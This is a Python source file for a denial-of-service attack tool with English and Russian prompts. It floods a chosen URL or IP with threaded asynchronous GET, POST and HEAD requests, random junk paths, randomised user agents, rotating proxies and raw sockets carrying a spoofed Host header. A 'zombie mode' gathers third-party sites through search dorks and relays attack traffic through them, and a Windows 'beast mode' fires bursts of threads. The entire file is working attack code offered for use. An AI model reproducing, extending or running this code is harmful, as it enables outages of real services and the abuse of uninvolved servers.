import os
import time
import fade
import ctypes
import random
import asyncio
import aiohttp
import socket
import base64
import urllib3
from datetime import datetime
from pythonping import ping
from sys import platform
from threading import Thread, Lock
from fake_useragent import UserAgent
from colorama import Fore, Style, Back, init
from core.etc.functions import logo_ddos, get_lang, get_proxies
from core.ddos_attack.zombie_gatherer import gather_zombies, load_dorks as load_zombie_dorks, search_zombies as search_zombie_candidates, validate_zombie as validate_zombie_candidate

urllib3.disable_warnings()
init()


class DDoSAttack:
    def __init__(self):
        self.r = '0'
        self.r2 = '0'
        self.text = "{}"
        self.url2 = ''
        self.ports = []
        self.lock = Lock()
        self.lang = get_lang()
        self.todo = 0
        self.started = 0
        self.ua = UserAgent()
        self.proxies = get_proxies()
        self.lib = "1234567890qwertyuiop[]asdfghjkl;'zxcvbnm,./_"
        self.zombies = []
        self.zombie_mode = False

    def load_zombies(self, path):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                self.zombies = [line.strip() for line in f if line.strip()]
            return self.zombies
        except Exception:
            return []

    def stat(self):
        if platform == 'win32':
            ctypes.windll.kernel32.SetConsoleTitleW(f"💣 ・ Successs: {self.r}")

        if self.started == self.todo:
            with self.lock:
                if self.lang == 'ru':
                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'СТАТУС' + Fore.WHITE + '] ' +
                          Fore.GREEN + 'ОТПРАВЛЕНО: ' + Fore.MAGENTA + self.r + Fore.RED + ' ОШИБКИ: ' + self.r2)
                else:
                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'STATUS' + Fore.WHITE + '] ' +
                          Fore.GREEN + 'SENT: ' + Fore.MAGENTA + self.r + Fore.RED + ' FAILS: ' + self.r2)

    async def ddos_thread(self, target, use_proxy, proxy):
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
            user = self.ua.random
            now = datetime.now()
            st = ''
            st2 = ''

            if use_proxy == "y" and proxy == "":
                proxy_2 = "http://" + random.choice(self.proxies)
            elif proxy != "":
                proxy_2 = proxy
            else:
                proxy_2 = ""

            for _ in range(random.randint(10, 200)):
                st += random.choice(self.lib)

            for _ in range(random.randint(100, 500)):
                st2 += random.choice(self.lib)

            header = {'user-agent': user}

            try:
                host = self.url2.replace('http://', '')
                host = self.url2.replace('https://', '')
                host2 = host.split('/')[0]
                ping(host2, verbose=False)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                fake_ip = '182.21.20.32'
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target, 80))
                sock.sendto(("GET /" + target + " HTTP/2\r\n").encode('ascii'), (target, 80))
                sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, 80))
                sock.close()
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.get(self.url2, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.get(self.url2 + '/' + st2, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.get(self.url2, headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.get(self.url2 + '/' + st2, headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, data=st, headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, data=st, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, json=st, headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, json=st, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.head(self.url2, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, auth=(st, st), timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.get(self.url2, auth=(st, st), timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, auth=(st, st), headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.get(self.url2, auth=(st, st), headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

    def run_thread(self, time_a, target, use_proxy, proxy=""):
        if self.url2[-1] == '/':
            self.url2 = self.url2.rstrip('/')

        t = time.monotonic()
        if use_proxy != 'y':
            proxy = ""
        while time.monotonic() - t < time_a:
            asyncio.run(self.ddos_thread(target, use_proxy, proxy))

    async def zombie_ddos_thread(self, target, use_proxy, proxy):
        if not self.zombies:
            return
        zombie = random.choice(self.zombies)
        attack_url = zombie.rstrip('/') + target

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
            user = self.ua.random
            st = ''
            st2 = ''
            header = {'user-agent': user}

            if use_proxy == "y" and proxy == "":
                proxy_2 = "http://" + random.choice(self.proxies)
            elif proxy != "":
                proxy_2 = proxy
            else:
                proxy_2 = ""

            for _ in range(random.randint(10, 200)):
                st += random.choice(self.lib)
            for _ in range(random.randint(100, 500)):
                st2 += random.choice(self.lib)

            try:
                host = attack_url.replace('http://', '').replace('https://', '').split('/')[0]
                ping(host, verbose=False)
                self.r = str(int(self.r) + 1)
                self.stat()
            except Exception:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            for url in [attack_url, attack_url + '/' + st2, attack_url + '/' + st2]:
                try:
                    await session.get(url, headers=header, timeout=3, proxy=proxy_2)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except Exception:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()

            for url in [attack_url, attack_url + '/' + st2]:
                try:
                    await session.post(url, data=st, headers=header, timeout=3, proxy=proxy_2)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except Exception:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()

            for url in [attack_url, attack_url]:
                try:
                    await session.post(url, json=st, headers=header, timeout=3, proxy=proxy_2)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except Exception:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()

            try:
                await session.head(attack_url, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except Exception:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

    def zombie_run_thread(self, time_a, target, use_proxy, proxy=""):
        t = time.monotonic()
        if use_proxy != 'y':
            proxy = ""
        while time.monotonic() - t < time_a:
            asyncio.run(self.zombie_ddos_thread(target, use_proxy, proxy))

    def beast_mode_attack(self, target, use_proxy, proxy_threads, todo):
        if platform == 'win32':
            VK_1 = 0x31
            VK_0 = 0x30

            if self.lang == 'ru':
                text = "Удерживайте '1' для атаки, '0' для выхода"
                text2 = "BEAST MODE АКТИВИРОВАН"
            else:
                text = "Hold '1' to attack, '0' to exit"
                text2 = "BEAST MODE ACTIVATED"

            print(f"\n{Back.RED}{Fore.WHITE}{Style.BRIGHT}{text2}{Fore.RESET}{Back.RESET}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}{text}{Fore.RESET}\n")

        try:
            while True:
                if ctypes.windll.user32.GetAsyncKeyState(VK_0) & 0x8000:
                    print(f"\n{Fore.RED}Beast mode deactivated.{Fore.RESET}")
                    break

                if ctypes.windll.user32.GetAsyncKeyState(VK_1) & 0x8000:
                    if proxy_threads == 'y':
                        for proxy in self.proxies:
                            for count in range(todo):
                                th = Thread(target=self.run_thread, args=(1, target, use_proxy, proxy,), daemon=True)
                                th.start()
                                self.started += 1
                    else:
                        for count in range(todo):
                            th = Thread(target=self.run_thread, args=(1, target, use_proxy,), daemon=True)
                            th.start()
                            self.started += 1
                    time.sleep(0.3)
                else:
                    time.sleep(0.05)

        except KeyboardInterrupt:
            print(f"\n\n{Fore.RED}Beast mode interrupted.{Fore.RESET}")
        else:
            print(Fore.RED + "Beast mode is only supported on Windows." + Fore.RESET)
            time.sleep(2)

    def start_ddos(self):
        state = ''
        url4 = ''

        if self.lang == 'ru':
            text = "\nUrl или IP для атаки > "
            text_mode = "\nРежим атаки:\n  [1] Собрать зомби и атаковать\n  [2] Атаковать напрямую\nВыбор [2]: "
        else:
            text = "\nUrl or IP for attack > "
            text_mode = "\nAttack mode:\n  [1] Gather zombies & attack\n  [2] Attack directly from this computer\nChoice [2]: "

        url = input(Fore.YELLOW + Style.BRIGHT + text + Fore.GREEN)
        self.url2 = url

        mode = input(Fore.YELLOW + Style.BRIGHT + text_mode + Fore.GREEN).strip() or "2"

        if mode == "1":
            self._zombie_mode_attack(url)
            return

        if url.find("http://") != -1:
            url = url.replace('http://', '')
            try:
                url3 = url.replace('.', '')
                url3 = int(url3)
                state = 'ip'
            except:
                state = 'url'

        elif url.find("https://") != -1:
            url = url.replace('https://', '')
            try:
                url3 = url.replace('.', '')
                url3 = int(url3)
                state = 'ip'
            except:
                state = 'url'

        else:
            state = 'ip'

        ok = True

        if state == 'url':
            cnt = 0
            for symb in url:
                if symb == '/':
                    cnt += 1
                if cnt == 3:
                    break
                url4 += symb

            try:
                url4 = url4.split('/')[0]
                url = socket.gethostbyname(url4)
            except:
                if self.lang == 'ru':
                    text = 'Во время обработки url произошла ошибка, проверьте правильность введенных данных.'
                else:
                    text = 'An error occurred while processing the url, check that the data entered is correct.'
                print(Back.RED + Fore.WHITE + text + Fore.RESET + Style.RESET_ALL)
                time.sleep(2)
                ok = False

        if ok is True:
            if self.lang == 'ru':
                text = 'IP цели: '
                text2 = 'Использовать прокси? (y/n) > '
                text3 = 'Потоки > '
                text4 = 'Время атаки (в сек.) > '
                text5 = '\n!НЕ РЕКОМЕНДУЕТСЯ!'
                text6 = '\nЗапустить потоки для каждой прокси? (y/n) > '
                text7 = 'поток запущен'
            else:
                text = 'Target IP: '
                text2 = 'Use proxies? (y/n) > '
                text3 = 'Threads > '
                text4 = 'Time attack (in sec.) > '
                text5 = '\n!NOT RECOMMENDED!'
                text6 = '\nStart threads for every proxy? (y/n) > '
                text7 = 'thread started'

            print(Back.YELLOW + Fore.BLACK + text + url + Fore.RESET + Style.RESET_ALL)

            if not self.proxies:
                use_proxy = 'n'
            else:
                use_proxy = input(Fore.YELLOW + Style.BRIGHT + text2 + Fore.GREEN).lower()

            self.todo = int(input(Fore.YELLOW + Style.BRIGHT + text3 + Fore.GREEN))
            time_attack = int(input(Fore.YELLOW + Style.BRIGHT + text4 + Fore.GREEN))

            if use_proxy == 'y':
                print(Back.RED + Fore.WHITE + text5 + Fore.RESET + Style.RESET_ALL)
                proxy_threads = input(Fore.YELLOW + Style.BRIGHT + text6 + Fore.GREEN).lower()
            else:
                proxy_threads = 'n'

            beast_input = input(Fore.YELLOW + Style.BRIGHT + "\nEnable beast mode (hold 1 to attack)? (y/n): " + Fore.GREEN).lower()
            if beast_input == 'y':
                self.beast_mode_attack(url, use_proxy, proxy_threads, self.todo)
                return

            th = None

            if proxy_threads == 'y':
                for proxy in self.proxies:
                    for count in range(self.todo):
                        th = Thread(target=self.run_thread, args=(time_attack, url, use_proxy, proxy,), daemon=True)
                        th.start()
                        self.started += 1
                        print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                              Fore.YELLOW + Style.BRIGHT + text7)

            else:
                for count in range(self.todo):
                    th = Thread(target=self.run_thread, args=(time_attack, url, use_proxy,), daemon=True)
                    th.start()
                    self.started += 1
                    print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                          Fore.YELLOW + Style.BRIGHT + text7)

            time.sleep(1)

            th.join()

    def _zombie_mode_attack(self, target):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        dorks_file = os.path.join(script_dir, "dorks.txt")
        zombies_file = os.path.join(script_dir, "zombies.txt")

        if self.lang == 'ru':
            text_z = f"\nФайл дорков [{dorks_file}]"
            text_zombies = f"Файл зомби [{zombies_file}]"
            text_max = "Макс. зомби для сбора > "
            text_threads = "Потоки > "
            text_time = "Время атаки (в сек.) > "
            text_proxy = "Использовать прокси? (y/n) > "
            text_load = "\nЗагрузить зомби из файла вместо сбора? (y/n) > "
        else:
            text_z = f"\nDorks file [{dorks_file}]"
            text_zombies = f"Zombies file [{zombies_file}]"
            text_max = "Max zombies to gather > "
            text_threads = "Threads > "
            text_time = "Time attack (in sec.) > "
            text_proxy = "Use proxies? (y/n) > "
            text_load = "\nLoad zombies from file instead of gathering? (y/n) > "

        print(text_z)
        print(text_zombies)

        load_only = input(Fore.YELLOW + Style.BRIGHT + text_load + Fore.GREEN).lower()
        if load_only == 'y':
            self.load_zombies(zombies_file)
        else:
            if not os.path.exists(dorks_file):
                print(f"{Fore.RED}[!] Dorks file not found: {dorks_file}{Fore.RESET}")
                return
            max_zombies = int(input(Fore.YELLOW + Style.BRIGHT + text_max + Fore.GREEN))
            gather_zombies(dorks_file, zombies_file, max_zombies=max_zombies)
            self.load_zombies(zombies_file)

        if not self.zombies:
            print(f"{Fore.RED}[!] No zombies available. Aborting.{Fore.RESET}")
            return

        print(f"{Fore.GREEN}[+] Loaded {len(self.zombies)} zombies.{Fore.RESET}")

        target = target.rstrip('/')
        if not target.startswith("http://") and not target.startswith("https://"):
            target = "http://" + target

        self.zombie_mode = True
        self.url2 = target

        use_proxy = 'n'
        if self.proxies:
            use_proxy = input(Fore.YELLOW + Style.BRIGHT + text_proxy + Fore.GREEN).lower()

        self.todo = int(input(Fore.YELLOW + Style.BRIGHT + text_threads + Fore.GREEN))
        time_attack = int(input(Fore.YELLOW + Style.BRIGHT + text_time + Fore.GREEN))

        print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.todo) + Fore.WHITE + '] ' +
              Fore.YELLOW + Style.BRIGHT + 'zombie threads started')

        threads = []
        for count in range(self.todo):
            th = Thread(target=self.zombie_run_thread, args=(time_attack, target, use_proxy), daemon=True)
            th.start()
            threads.append(th)
            self.started += 1

        time.sleep(1)
        for th in threads:
            th.join()

    def start_ddos_direct(self, url):
        state = 'ip'

        if url.find("http://") != -1:
            url = url.replace('http://', '')
            try:
                url3 = url.replace('.', '')
                url3 = int(url3)
                state = 'ip'
            except:
                state = 'url'

        elif url.find("https://") != -1:
            url = url.replace('https://', '')
            try:
                url3 = url.replace('.', '')
                url3 = int(url3)
                state = 'ip'
            except:
                state = 'url'

        else:
            state = 'ip'

        ok = True

        if state == 'url':
            cnt = 0
            url4 = ''
            for symb in url:
                if symb == '/':
                    cnt += 1
                if cnt == 3:
                    break
                url4 += symb

            try:
                url4 = url4.split('/')[0]
                url = socket.gethostbyname(url4)
            except:
                if self.lang == 'ru':
                    text = 'Во время обработки url произошла ошибка, проверьте правильность введенных данных.'
                else:
                    text = 'An error occurred while processing the url, check that the data entered is correct.'
                print(Back.RED + Fore.WHITE + text + Fore.RESET + Style.RESET_ALL)
                time.sleep(2)
                ok = False

        if ok is True:
            if self.lang == 'ru':
                text = 'IP цели: '
                text2 = 'Использовать прокси? (y/n) > '
                text3 = 'Потоки > '
                text4 = 'Время атаки (в сек.) > '
                text5 = '\n!НЕ РЕКОМЕНДУЕТСЯ!'
                text6 = '\nЗапустить потоки для каждой прокси? (y/n) > '
                text7 = 'поток запущен'
            else:
                text = 'Target IP: '
                text2 = 'Use proxies? (y/n) > '
                text3 = 'Threads > '
                text4 = 'Time attack (in sec.) > '
                text5 = '\n!NOT RECOMMENDED!'
                text6 = '\nStart threads for every proxy? (y/n) > '
                text7 = 'thread started'

            print(Back.YELLOW + Fore.BLACK + text + url + Fore.RESET + Style.RESET_ALL)

            if not self.proxies:
                use_proxy = 'n'
            else:
                use_proxy = input(Fore.YELLOW + Style.BRIGHT + text2 + Fore.GREEN).lower()

            self.todo = int(input(Fore.YELLOW + Style.BRIGHT + text3 + Fore.GREEN))
            time_attack = int(input(Fore.YELLOW + Style.BRIGHT + text4 + Fore.GREEN))

            if use_proxy == 'y':
                print(Back.RED + Fore.WHITE + text5 + Fore.RESET + Style.RESET_ALL)
                proxy_threads = input(Fore.YELLOW + Style.BRIGHT + text6 + Fore.GREEN).lower()
            else:
                proxy_threads = 'n'

            beast_input = input(Fore.YELLOW + Style.BRIGHT + "\nEnable beast mode (hold 1 to attack)? (y/n): " + Fore.GREEN).lower()
            if beast_input == 'y':
                self.beast_mode_attack(url, use_proxy, proxy_threads, self.todo)
                return

            th = None

            if proxy_threads == 'y':
                for proxy in self.proxies:
                    for count in range(self.todo):
                        th = Thread(target=self.run_thread, args=(time_attack, url, use_proxy, proxy,), daemon=True)
                        th.start()
                        self.started += 1
                        print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                              Fore.YELLOW + Style.BRIGHT + text7)

            else:
                for count in range(self.todo):
                    th = Thread(target=self.run_thread, args=(time_attack, url, use_proxy,), daemon=True)
                    th.start()
                    self.started += 1
                    print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                          Fore.YELLOW + Style.BRIGHT + text7)

            time.sleep(1)

            th.join()

